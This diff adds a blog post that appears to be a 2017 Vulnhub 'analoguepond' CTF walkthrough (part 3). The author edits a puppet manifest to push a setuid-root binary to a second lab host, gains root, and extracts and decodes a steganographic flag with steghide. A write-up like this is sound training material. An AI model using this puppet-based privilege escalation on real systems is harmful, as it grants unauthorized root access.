@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>[Vulnhub] analoguepond - Walkthrough Part 3 &middot; M1r4c13</title>
+<meta name="description" content="[Vulnhub] analoguepond - Walkthrough Part 3 -- M1r4c13 study notes, restored.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='2.2' fill='%23d8c08a'/%3E%3Ccircle cx='8' cy='8' r='6.5' fill='none' stroke='%23d8c08a' stroke-opacity='.35' stroke-width='.8'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+<header class="blog-head">
+<a class="mono back-link" href="/">xhyu@sky:~$ cd ~</a>
+<a class="brand brand-link" href="/blog/">M1r4c13</a>
+</header>
+<main><article class="post">
+<h1 class="post-title">[Vulnhub] analoguepond - Walkthrough Part 3</h1>
+<p class="meta"><span class="mono meta-date">2017.08.10</span><span class="tags"><span class="chip mono">vulnhub</span><span class="chip mono">ctf</span></span></p>
+<div class="post-body"><p>Hi, guys.<br>
+Ok, now I'm in the third host. <code>nleeson@barringsbank:~$</code></p>
+<p>I found this 'lovely' file again at the home dir: <em>reticulatingsplines.gif</em>, remember that I've got a .gif with the same name in part 1? This is also nothing special.</p>
+<p>Then, I tried <code>netstat</code>, nothing apart from ssh. Looked at <code>uname</code>, at least not obviously vulnerable. Searched for suid and sgid, nothing interesting. Navigate to /etc? Oh, I saw the familiar <em>puppet</em> folder, but there is nothing interesting inside.</p>
+<p>Then, after taking a look at <a href="https://www.fabianmurer.ch/vulnhub-analoguepond-1-walkthrough-part-3/">Fabian's walkthrough</a>, I finally knew what to do.</p>
+<p>These two hosts form a puppet system, which means it can transmit files with root permission between systems. So now that I have the root permission of the puppet server, I can create a suid file, like the spin, and throw it on to nleeson's host.</p>
+<p>I don't need to transmit the new spin file from 192.168.122.2 to .3, I just need to modify the target in puppet configuration.</p>
+<p>I ever noticed this in 192.168.122.2:</p>
+<pre><code class="language-bash">sandieshaw@puppet:/etc/puppet/manifests$ cat site.pp 
+node 'default' {
+  include vulnhub
+  }
+
+node 'puppet.example.com' inherits 'default' {
+  include wiggle
+  }
+
+node 'barringsbank.example.com' inherits 'default' {
+  include fiveeights
+  }
+</code></pre>
+<p>I don't know the details of what does this mean, but I think now that I used wiggle to synchronize files in puppet, I should use fiveeights in barringsbank. Also, the init.pp inside fiveeights supports my idea because this <em>authorized_keys</em> matches exactly the file on barringsbank host.</p>
+<pre><code class="language-bash">sandieshaw@puppet:/etc/puppet/modules/fiveeights/manifests$ cat init.pp
+## Nick's secret file hide the screw-ups
+class fiveeights {
+
+## private key held elsewhere. Keep looking
+  file { '/home/nleeson/.ssh/authorized_keys':
+  content =&gt; &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTPnm+I5zEPNUHc1PgmsIxK8XCvtRECY6nTFOdNL3CxVBepWLv0wgPWBIUAkP9nfPUshXo1EIjcvb0+RGtJ8KNbVK4vW2ZCwgNicUoYnCcVtSrGtz9oAnKpeGcCKAuHG6ybt4Opxe75eF4dZt2/aDRrPMw8PK8l8a3o9ZdJlIgdLiWORPiga/zUu1zuySkQPFHzPBp29MvWVwAYsssEjcXINfuvysPbdBzMJaJ2o4jmFV9g/uCz3xjRi9zULP1VpoRYtZUQadU2CpuN1RtVDeoSeYVe6vYkeLz6rCBQTUfi9Nea4X1JtvaTfnrquRMWOr43WnMMcdFpIsBd8oCI4jH root@puppet&quot;,
+  }
+}
+</code></pre>
+<p>Now modify <em>init.pp</em> to transmit <em>spin</em></p>
+<pre><code class="language-bash">sandieshaw@puppet:/etc/puppet/modules/fiveeights/manifests$ cat init.pp
+class fiveeights {
+  file { [ &quot;/tmp/spin&quot; ]:
+    ensure  =&gt; present,
+    mode    =&gt; 4755,
+    owner   =&gt; root,
+    group   =&gt; root,
+    source  =&gt; &quot;puppet:///modules/wiggle/spin&quot;;
+  }
+}
+</code></pre>
+<p>I waited for couple of minutes, executed it, and there we go.</p>
+<pre><code class="language-bash">nleeson@barringsbank:~$ /tmp/spin 
+# whoami
+root
+# id
+uid=1000(nleeson) gid=1000(nleeson) euid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(nleeson)
+# cd /root
+# ls -la
+total 236
+drwx------  3 root    root      4096 Jan  7  2017 .
+drwxr-xr-x 22 root    root      4096 Jan  7  2017 ..
+-rw-r--r--  1 root    root      3106 Feb 20  2014 .bashrc
+-rw-rw-r--  1 nleeson nleeson 220099 Dec 21  2016 me.jpeg
+-rw-r--r--  1 root    root       140 Feb 20  2014 .profile
+drwx------  2 root    root      4096 Dec 18  2016 .ssh
+</code></pre>
+<p>Ok, me.jpeg, it should be you.</p>
+<p>Tunnel the me.jpeg out to my kali, check the info:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/analoguepond# steghide --info me.jpeg 
+&quot;me.jpeg&quot;:
+  format: jpeg
+  capacity: 11.9 KB
+Try to get information about embedded data ? (y/n) 
+Enter passphrase: 
+  embedded file &quot;primate_egyptian_flag.txt&quot;:
+    size: 3.7 KB
+    encrypted: rijndael-128, cbc
+    compressed: yes
+</code></pre>
+<p>It asked for passphrase, I don't think I have anything left except those two <em>reticulatingsplines.gif</em> files. So I provide <strong>'reticulatingsplines'</strong>, and it passed!</p>
+<p>Now extract the file from it.</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/analoguepond# steghide extract -sf me.jpeg -p reticulatingsplines
+</code></pre>
+<p>I got a <em>primate_egyptian_flag.txt</em></p>
+<p>Cooked it in the same way:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/analoguepond# xxd -r -p primate_egyptian_flag.txt | rev | base64 --decode 
+
+Here's a fender bass for you...
+
+                                  ,-.        _.---._
+                                |  `\.__.-''       `.
+                                 \  _        _  ,.   \
+           ,+++=._________________)_||______|_|_||    |
+          (_.ooo.===================||======|=|=||    |
+             ~~'                 |  ~'      `~' o o  /
+                                  \   /~`\     o o  /
+                                   `~'    `-.____.-' 
+
+
+Congratulations to you once again and for the sixth time on capturing this
+flag! 
+
+I've tried to mix things up a bit here, to move away from throw metasploit
+and web exploits at things. I hope you have enjoyed that portion and your
+feedback on this aspect would be appreciated.
+
+Of note, these VMs are set to do automatic security updates using puppet,
+so this ought to keep things dynamic enough for people.
+
+Many thanks to mrB3n, Rand0mByteZ and kevinnz for testing this CTF.
+
+A special thank you to g0tmi1k for hosting all these challenges and the
+valuable advice. A tip of the hat to mrb3n for his recent assistance. Hit
+me on IRC or twitter if you are looking for a hint or have completed the
+challenge.
+
+Go on, Complete the circle: 06:30 to 07:45 of episode #1 of Our Friends In The North (C) BBC 1995.. What's the connection....?
+                                                           --Knightmare
+</code></pre>
+<p>Sweet! Finally! Got the flag! :D</p>
+<p>Thank you dude, this is a good box, I learned many things.</p>
+<p>As for the last video, I've watched it, nothing special found. I don't know what 'complete the circle' means. I also don't know why he says 'what's the connection....?' </p>
+<p>But, anyway, I assume this is the end of it. If anyone knows about the following or have any suggestion, please leave a comment.</p>
+<p>That's it. Thank you very much!</p>
+<p>Cheers!</p></div>
+</article></main>
+<footer class="blog-foot">
+ <p class="mono foot-line">m1r4c13 &middot; study notes &middot; 2017 to 2018 &middot; restored</p>
+ <p class="coda"><span class="cn-inline">世界并不完美，却令人着迷。</span></p>
+</footer>
+</body>
+</html>
